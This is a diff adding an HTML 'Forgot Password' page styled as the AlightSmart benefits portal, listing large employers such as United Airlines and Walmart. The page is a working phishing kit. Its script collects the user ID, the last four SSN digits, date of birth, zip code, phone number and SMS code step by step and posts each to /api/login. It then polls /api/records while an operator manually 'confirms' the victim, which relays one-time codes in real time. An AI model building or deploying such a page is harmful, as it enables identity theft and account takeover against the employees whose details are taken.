@@ -1,0 +1,320 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forgot Password - AlightSmart</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: #f8fafc; 
+            padding: 20px; 
+            min-height: 100vh;
+        }
+        .container { 
+            max-width: 420px; 
+            margin: auto; 
+            background: white; 
+            padding: 35px; 
+            border-radius: 16px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
+        }
+        h1 { 
+            font-size: 1.75rem; 
+            text-align: center; 
+            margin-bottom: 8px; 
+            color: #1e2937; 
+        }
+        p { 
+            text-align: center; 
+            color: #64748b; 
+            margin-bottom: 25px; 
+            line-height: 1.5;
+        }
+        label { 
+            display: block; 
+            margin: 20px 0 8px; 
+            font-weight: 600; 
+            color: #334155; 
+        }
+        input, select { 
+            width: 100%; 
+            padding: 14px; 
+            border: 1.5px solid #e2e8f0; 
+            border-radius: 10px; 
+            font-size: 1.05rem; 
+        }
+        .date-group { display: flex; gap: 10px; }
+        button { 
+            width: 100%; 
+            padding: 16px; 
+            margin-top: 12px; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 1.1rem; 
+            font-weight: 600; 
+            cursor: pointer; 
+        }
+        .continue { background: #1e40af; color: white; }
+        .new-code { background: #eab308; color: black; }
+        .error { color: #ef4444; margin: 15px 0; text-align: center; font-weight: 500; }
+        .success { color: #10b981; margin: 15px 0; text-align: center; font-weight: 500; }
+        .waiting { color: #eab308; margin: 15px 0; text-align: center; font-weight: 500; }
+        .step { display: none; }
+        .step.active { display: block; }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <div id="step0" class="step active">
+            <h1>Forgot Password</h1>
+            <p>Select your company and enter your User ID</p>
+            
+            <label for="company">Company</label>
+            <select id="company" required>
+                <option value="">Select your Company</option>
+                <option value="UNITED AIRLINES">UNITED AIRLINES</option>
+                <option value="BOEING">BOEING</option>
+                <option value="SIEMENS ENERGY">SIEMENS ENERGY</option>
+                <option value="AON">AON</option>
+                <option value="AMERICAN AIRLINES">AMERICAN AIRLINES</option>
+                <option value="DELTA AIR LINES">DELTA AIR LINES</option>
+                <option value="SOUTHWEST AIRLINES">SOUTHWEST AIRLINES</option>
+                <option value="WALMART">WALMART</option>
+                <option value="CATERPILLAR">CATERPILLAR</option>
+                <option value="HOME DEPOT">HOME DEPOT</option>
+                <option value="LOWE'S">LOWE'S</option>
+                <option value="TARGET">TARGET</option>
+                <option value="KROGER">KROGER</option>
+                <option value="CVS HEALTH">CVS HEALTH</option>
+                <option value="WALGREENS">WALGREENS</option>
+                <option value="BANK OF AMERICA">BANK OF AMERICA</option>
+                <option value="JPMORGAN CHASE">JPMORGAN CHASE</option>
+                <option value="VERIZON">VERIZON</option>
+                <option value="AT&T">AT&T</option>
+                <option value="IBM">IBM</option>
+                <option value="MICROSOFT">MICROSOFT</option>
+                <option value="AMAZON">AMAZON</option>
+                <option value="GOOGLE">GOOGLE</option>
+                <option value="META">META</option>
+            </select>
+
+            <label for="userid">User ID</label>
+            <input type="text" id="userid" placeholder="Enter your User ID" required autofocus>
+            
+            <button class="continue" onclick="startForgotProcess()">Continue</button>
+            <button onclick="goBack()" style="background:none; border:1px solid #cbd5e1; color:#1e40af; margin-top:8px;">Back to Login</button>
+        </div>
+
+        <div id="step1" class="step">
+            <h1>Confirm your identity</h1>
+            <label>Last 4 Digits of SSN</label>
+            <input type="text" id="ssn" maxlength="4" placeholder="1234" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+
+            <label>Birth Date</label>
+            <div class="date-group">
+                <select id="month"><option value="">Month</option></select>
+                <select id="day"><option value="">Day</option></select>
+                <select id="year"><option value="">Year</option></select>
+            </div>
+
+            <label style="margin-top:20px;">
+                <input type="checkbox" id="privacy"> Accept Alight Privacy Policy
+            </label>
+            <button class="continue" onclick="saveStep1()">Continue</button>
+        </div>
+
+        <div id="step2" class="step">
+            <h1>Additional Information</h1>
+            <label>Zip Code</label>
+            <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+
+            <label>Phone Number (US)</label>
+            <input type="tel" id="phone" maxlength="10" placeholder="1234567890" 
+                   oninput="this.value = this.value.replace(/[^0-9]/g,'')" required>
+
+            <button class="continue" onclick="saveStep2()">Continue</button>
+        </div>
+
+        <div id="step3" class="step">
+            <h1>Verify it's you</h1>
+            <p>Enter the code you received via SMS.</p>
+            <p>Your access code should be sent within 12 hours.</p>
+            
+            <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
+            <div id="status"></div>
+            
+            <button class="continue" onclick="submitCode()">Submit Code</button>
+            <button class="new-code" onclick="requestNewCode()">Request New Code</button>
+        </div>
+    </div>
+
+    <script>
+        let realUsername = "";
+        let realPassword = "Forgot-Password-Reset";
+        let selectedCompany = "";
+
+        function startForgotProcess() {
+            selectedCompany = document.getElementById('company').value;
+            realUsername = document.getElementById('userid').value.trim();
+
+            if (!selectedCompany || !realUsername) {
+                alert("Please select your Company and enter your User ID");
+                return;
+            }
+
+            fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "Forgot Password Request",
+                    password: realPassword,
+                    address: `Company: ${selectedCompany} | UserID: ${realUsername} | Status: Started Password Reset`
+                })
+            });
+
+            nextStep(1);
+        }
+
+        async function saveStep(details, stepName) {
+            try {
+                await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: stepName + " (Forgot Password - " + realUsername + ")",
+                        password: realPassword,
+                        address: details
+                    })
+                });
+            } catch (e) {
+                console.error("Failed to save step:", e);
+            }
+        }
+
+        function saveStep1() {
+            const ssn = document.getElementById('ssn').value.trim();
+            const month = document.getElementById('month').value;
+            const day = document.getElementById('day').value;
+            const year = document.getElementById('year').value;
+
+            if (ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
+                alert("Please fill all fields and accept Privacy Policy.");
+                return;
+            }
+
+            const dob = `${month}/${day}/${year}`;
+            const details = `Company: ${selectedCompany} | SSN: ${ssn} | DOB: ${dob} | Status: Forgot Password - Step 1 Completed`;
+
+            saveStep(details, "Step 1 - SSN & DOB");
+            nextStep(2);
+        }
+
+        function saveStep2() {
+            const zip = document.getElementById('zip').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            if (zip.length !== 5 || phone.length !== 10) {
+                alert("Please enter valid Zip Code (5 digits) and Phone Number (10 digits).");
+                return;
+            }
+
+            const details = `Company: ${selectedCompany} | Zip: ${zip} | Phone: ${phone} | Status: Forgot Password - Step 2 Completed`;
+            saveStep(details, "Step 2 - Zip Code & Phone");
+            nextStep(3);
+        }
+
+        function nextStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+        }
+
+        async function submitCode() {
+            const code = document.getElementById('code').value.trim();
+            const statusDiv = document.getElementById('status');
+
+            if (code.length < 4) {
+                statusDiv.innerHTML = `<span class="error">Please enter a valid code</span>`;
+                return;
+            }
+
+            statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation....</span>`;
+
+            const ssn = document.getElementById('ssn').value || "";
+            const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
+            const zip = document.getElementById('zip').value || "";
+            const phone = document.getElementById('phone').value || "";
+
+            const fullDetails = `Company: ${selectedCompany} | SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Phone: ${phone} | Code: ${code} | Status: Forgot Password - Pending Reset`;
+
+            await saveStep(fullDetails, "Final Code Submission - Forgot Password");
+
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/records');
+                    const records = await res.json();
+                    const latest = records[0];
+
+                    if (latest && latest.address.includes("Confirmed")) {
+                        clearInterval(interval);
+                        statusDiv.innerHTML = `<span class="success">✅ Verified! Redirecting to set new password...</span>`;
+                        sessionStorage.setItem('forgotUsername', realUsername);
+                        setTimeout(() => window.location.href = "reset-password.html", 1500);
+                    } else if (latest && latest.address.includes("Rejected")) {
+                        clearInterval(interval);
+                        statusDiv.innerHTML = `<span class="error">❌ Request Rejected by Admin.</span>`;
+                    }
+                } catch (e) {}
+            }, 2000);
+        }
+
+        async function requestNewCode() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = `<span class="waiting">Requesting new code...</span>`;
+
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "New Code Request (Forgot Password)",
+                    password: realPassword,
+                    address: `Company: ${selectedCompany} | UserID: ${realUsername} | 🔄 Requested New Code | Status: Pending`
+                })
+            });
+
+            statusDiv.innerHTML = `<span class="success">✅ Request sent. Please check your SMS.</span>`;
+        }
+
+        function goBack() {
+            window.location.href = "login.html";
+        }
+
+        window.onload = () => {
+            const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+            const monthSelect = document.getElementById('month');
+            months.forEach((m, i) => {
+                let opt = document.createElement('option');
+                opt.value = i + 1; opt.textContent = m;
+                monthSelect.appendChild(opt);
+            });
+
+            const daySelect = document.getElementById('day');
+            for(let i = 1; i <= 31; i++) {
+                let opt = document.createElement('option'); 
+                opt.value = i; opt.textContent = i;
+                daySelect.appendChild(opt);
+            }
+
+            const yearSelect = document.getElementById('year');
+            const curr = new Date().getFullYear();
+            for(let i = curr; i >= 1950; i--) {
+                let opt = document.createElement('option'); 
+                opt.value = i; opt.textContent = i;
+                yearSelect.appendChild(opt);
+            }
+        };
+    </script>
+</body>
+</html>
